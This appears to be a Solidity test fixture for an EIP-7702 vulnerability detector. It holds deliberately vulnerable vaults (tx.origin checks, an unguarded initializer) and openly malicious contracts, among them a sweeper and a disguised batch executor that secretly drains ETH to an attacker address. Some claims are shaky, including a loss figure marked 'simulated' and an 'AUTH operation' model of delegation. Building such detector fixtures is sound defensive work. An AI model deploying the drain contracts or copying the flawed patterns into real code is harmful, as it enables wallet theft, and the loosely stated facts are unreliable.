// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title DelegateAccessControl
 * @notice EIP-7702 Set Code Delegation Vulnerabilities
 *
 * VULNERABILITY: Access control bypass via EOA delegation
 * EIP: EIP-7702 (Pectra upgrade, expected 2025)
 *
 * BACKGROUND:
 * EIP-7702 allows EOAs (Externally Owned Accounts) to temporarily delegate their code
 * to a smart contract during a transaction. This enables smart contract wallet
 * features for regular wallets but introduces new attack vectors.
 *
 * KEY CONCEPTS:
 * - EOA can set its code to any contract via AUTH operation
 * - Delegation is transaction-scoped (resets after transaction)
 * - tx.origin still returns EOA address
 * - Storage is EOA's storage, not delegated contract's
 *
 * SECURITY RISKS:
 * 1. Access control bypass (tx.origin == delegated EOA)
 * 2. Phishing attacks (EOA delegates to malicious contract)
 * 3. Storage collision (delegated contract uses EOA storage)
 * 4. Sweeper contracts (drain all tokens from EOA)
 *
 * REAL-WORLD CONTEXT:
 * - $1.54M lost in August 2025 initialization front-running (simulated)
 * - Batch phishing attacks possible
 * - tx.origin checks become completely broken
 *
 * TESTED DETECTORS:
 * - eip7702-delegate-access-control
 * - eip7702-sweeper-detection
 * - eip7702-batch-phishing
 * - eip7702-txorigin-bypass
 * - eip7702-storage-collision
 * - eip7702-init-frontrun
 */

/**
 * @title VaultWithTxOriginCheck
 * @notice Vulnerable vault using tx.origin for access control
 */
contract VaultWithTxOriginCheck {
    mapping(address => uint256) public balances;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @notice VULNERABILITY 1: tx.origin check breaks with EIP-7702
     * @dev With EIP-7702, EOA can delegate to attacker's contract
     *      tx.origin will still be the EOA, bypassing this check
     */
    function adminWithdraw(address to, uint256 amount) external {
        // VULNERABLE: tx.origin check is useless with EIP-7702
        // EOA owner delegates to attacker contract → tx.origin == owner ✓
        // But code execution is attacker's → funds stolen
        require(tx.origin == owner, "Not owner");

        payable(to).transfer(amount);
    }

    /**
     * @notice VULNERABILITY 2: tx.origin for authentication
     */
    function emergencyStop() external {
        require(tx.origin == owner, "Not authorized");
        // Emergency logic
    }

    receive() external payable {}
}

/**
 * @title SweeperContract
 * @notice Malicious contract designed to sweep tokens when EOA delegates
 */
contract SweeperContract {
    /**
     * @notice VULNERABILITY 3: Sweeper attack via EIP-7702
     * @dev When EOA delegates to this contract, it can drain all tokens
     *
     * ATTACK FLOW:
     * 1. Attacker tricks EOA owner to sign EIP-7702 delegation
     * 2. EOA's code becomes this contract (for one transaction)
     * 3. This contract transfers all ETH and tokens to attacker
     * 4. Transaction ends, delegation resets
     * 5. Victim's wallet is drained
     */
    function sweepAll(address attacker) external {
        // Sweep ETH
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            payable(attacker).transfer(ethBalance);
        }

        // Could also sweep ERC20 tokens
        // IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)))
    }

    /**
     * @notice VULNERABILITY 4: Approve attacker for future theft
     */
    function approveAttacker(address token, address attacker) external {
        // Even worse: Give attacker permanent approval
        // This persists after delegation ends!
        // IERC20(token).approve(attacker, type(uint256).max);
    }
}

/**
 * @title DelegationPhishingHelper
 * @notice Phishing contract that looks legitimate but drains funds
 */
contract DelegationPhishingHelper {
    struct Call {
        address target;
        bytes data;
    }

    /**
     * @notice VULNERABILITY 5: Batch phishing via EIP-7702
     * @dev Appears to execute user's intended calls, but also drains funds
     *
     * PHISHING SCENARIO:
     * User wants to: Swap tokens on DEX
     * Attacker offers: "Use our gas-efficient batch contract!"
     * Reality: Batch includes hidden drain transaction
     */
    function batchExecute(Call[] calldata calls, address attacker) external returns (bytes[] memory) {
        bytes[] memory results = new bytes[](calls.length);

        // Execute user's legitimate calls
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = calls[i].target.call(calls[i].data);
            require(success, "Call failed");
            results[i] = result;
        }

        // HIDDEN: Drain ETH to attacker
        if (address(this).balance > 0) {
            payable(attacker).transfer(address(this).balance);
        }

        return results;
    }
}

/**
 * @title StorageCollisionVault
 * @notice Demonstrates storage collision vulnerability
 */
contract StorageCollisionVault {
    // Slot 0: owner
    address public owner;
    // Slot 1: initialized
    bool public initialized;
    // Slot 2: balances mapping
    mapping(address => uint256) public balances;

    /**
     * @notice VULNERABILITY 6: Storage collision with delegated contract
     * @dev When EOA delegates, it uses EOA's storage layout
     *      If layouts don't match → storage corruption
     */
    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }
}

/**
 * @title MaliciousDelegate
 * @notice Malicious contract with different storage layout
 */
contract MaliciousDelegate {
    // DIFFERENT LAYOUT: Slot 0 is attacker address
    address public attacker;
    // Slot 1: arbitrary data
    uint256 public data;

    /**
     * @notice VULNERABILITY 7: Storage collision attack
     * @dev When EOA delegates to this contract:
     *      - EOA's slot 0 (owner) gets overwritten with attacker address
     *      - Permanent corruption of EOA's storage
     */
    function corruptStorage(address _attacker) external {
        // Writing to attacker (slot 0) actually writes to delegator's slot 0
        attacker = _attacker;
        // Now the delegator's "owner" variable is set to attacker!
    }
}

/**
 * @title InitializationFrontrun
 * @notice Vulnerable to front-running during initialization
 */
contract InitializationFrontrun {
    address public owner;
    bool public initialized;

    /**
     * @notice VULNERABILITY 8: Initialization front-running with EIP-7702
     * @dev Attacker can front-run initialization by delegating EOA to malicious contract
     *
     * ATTACK: $1.54M August 2025 (simulated)
     * 1. User deploys proxy contract
     * 2. User sends initialize() transaction
     * 3. Attacker front-runs with EIP-7702 delegation to malicious contract
     * 4. Malicious contract's initialize() runs first
     * 5. Attacker becomes owner
     */
    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

/**
 * @title BatchDelegationAttack
 * @notice Multiple EOAs delegating in batch for coordinated attack
 */
contract BatchDelegationAttack {
    struct DelegateCall {
        address delegator; // EOA that will delegate
        bytes data;        // Execution data
    }

    /**
     * @notice VULNERABILITY 9: Batch delegation enables coordinated attacks
     * @dev Multiple EOAs delegate to this contract simultaneously
     *
     * USE CASES:
     * - Governance attacks (multiple voters delegate to vote maliciously)
     * - Market manipulation (multiple accounts dump tokens simultaneously)
     * - Flash mob attacks (coordinated protocol exploitation)
     */
    function executeBatch(DelegateCall[] calldata calls) external {
        for (uint256 i = 0; i < calls.length; i++) {
            // Each delegator's EOA executes their call
            // All happen in same transaction
            (bool success, ) = address(this).call(calls[i].data);
            require(success, "Batch call failed");
        }
    }
}

/**
 * @title SignatureValidator
 * @notice Validates signatures, vulnerable to EIP-7702
 */
contract SignatureValidator {
    /**
     * @notice VULNERABILITY 10: Signature validation bypass
     * @dev With EIP-7702, EOA can sign and then delegate to contract
     *      that manipulates the validation process
     */
    function validateSignature(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address expectedSigner
    ) external pure returns (bool) {
        address signer = ecrecover(hash, v, r, s);

        // VULNERABLE: Even if signature is valid, delegated code
        // can bypass subsequent checks
        return signer == expectedSigner;
    }
}
